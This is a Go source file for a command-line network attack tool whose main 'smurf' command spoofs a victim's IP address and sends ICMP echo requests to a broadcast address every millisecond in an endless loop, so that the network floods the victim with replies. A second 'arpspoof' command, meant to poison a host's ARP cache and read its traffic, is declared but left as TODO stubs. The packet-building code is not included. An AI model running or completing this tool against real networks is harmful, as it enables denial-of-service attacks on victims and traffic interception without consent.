package main

import (
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"time"

	"github.com/pkg/errors"
	cli "gopkg.in/urfave/cli.v1"
)

var version string // injected at build-time

func smurfValidator(ctx *cli.Context) error {
	return assertSet(ctx, targetFlag)
}

func smurfHandler(ctx *cli.Context) error {
	banner := "Victim: %s\nBroadcasting ICMP to: %s\nEvery: %s\nPayload:\n---\n%v---\n"

	target := net.ParseIP(ctx.String(name(targetFlag)))
	if target == nil {
		return errors.New("invalid target IP address")
	}

	broadcast := net.ParseIP(ctx.String(name(broadcastFlag)))
	if broadcast == nil {
		return errors.New("invalid broadcast IP address")
	}

	every, err := time.ParseDuration(ctx.String(name(everyFlag)))
	if err != nil {
		return errors.New("invalid time string given")
	}

	p, err := newPwner(target, broadcast, ctx.String(name(ifaceFlag)))
	if err != nil {
		return err
	}

	fmt.Printf(banner, target, broadcast, every.String(), hex.Dump(p.payload))
	for {
		if err = p.execute(); err != nil {
			return err
		}
		time.Sleep(every)
	}
}

func main() {
	app := cli.NewApp()
	app.Version = version
	app.EnableBashCompletion = true
	app.Usage = "a utility for injecting spoofed frames into a network"
	app.Commands = []cli.Command{
		{
			Name:    "smurf",
			Aliases: []string{"s"},
			Usage:   "make a network overwhelm a host with ICMP Echo replies",
			Flags: []cli.Flag{
				asMandatory(targetFlag),
				withDefault(broadcastFlag, "255.255.255.255"),
				withDefault(ifaceFlag, "en0"),
				withDefault(everyFlag, "1ms"),
			},
			Before: smurfValidator,
			Action: smurfHandler,
		},
		{
			Name:    "arpspoof",
			Aliases: []string{"a"},
			Usage:   "spoof a host's arp cache and read all of their traffic",
			Flags:   []cli.Flag{
				// TODO: flags
			},
			// TODO: before and action
		},
	}
	app.CommandNotFound = func(c *cli.Context, command string) {
		c.App.Run([]string{"help"})
		fmt.Printf("\ncommand \"%s\" does not exist\n", command)
	}
	if err := app.Run(os.Args); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
